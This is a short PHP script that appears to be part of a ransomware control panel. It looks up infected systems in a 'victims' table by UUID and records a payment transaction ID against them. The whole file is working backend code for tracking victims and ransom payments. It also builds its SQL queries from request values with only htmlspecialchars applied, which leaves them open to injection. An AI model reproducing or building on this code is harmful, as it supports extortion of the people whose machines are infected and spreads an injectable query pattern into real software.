<?php

$UUID = htmlspecialchars($_POST['UUID']);
$trans_ID = htmlspecialchars($_POST['trans_ID']);

require "conf.php";

$sql = "SELECT * FROM victims WHERE system_ID = '$UUID'";
$res = $conn -> query($sql);
$count = mysqli_num_rows($res);

if($count > 0)
{
	$sql = "UPDATE victims SET trans_ID = '$trans_ID' WHERE system_ID = '$UUID'";
	$res = $conn -> query($sql);
	echo json_encode(['status' => True, 'data' => "Record Updated"]);
}
else
{
	echo json_encode(['status' => True, 'data' => False]);
}

$conn -> close();

?>